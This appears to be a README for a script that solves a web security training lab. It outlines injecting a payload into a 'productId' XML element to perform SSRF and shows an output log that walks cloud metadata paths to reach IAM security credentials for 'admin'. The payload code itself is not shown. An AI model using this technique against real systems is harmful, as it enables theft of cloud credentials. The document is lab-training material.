## Hack Steps

1. Inject payload into 'productId' XML element to retrieve the path via SSRF
2. Extract the path from the response
3. Repeat the process with the new extracted path until you fetch the admin information

## Run Script

1. Change the URL of the lab
2. Start script

```
~$ python main.py
```

## Expected Output

```
⦗#⦘ Injection point: productId
⦗1⦘ Injecting payload to retrieve the path number 1.. OK => /latest/
⦗2⦘ Injecting payload to retrieve the path number 2.. OK => /latest/meta-data/
⦗3⦘ Injecting payload to retrieve the path number 3.. OK => /latest/meta-data/iam/
⦗4⦘ Injecting payload to retrieve the path number 4.. OK => /latest/meta-data/iam/security-credentials/
⦗5⦘ Injecting payload to retrieve the path number 5.. OK => /latest/meta-data/iam/security-credentials/admin/
❯❯ Fetching admin information.. OK
🗹 The lab should be marked now as solved
```
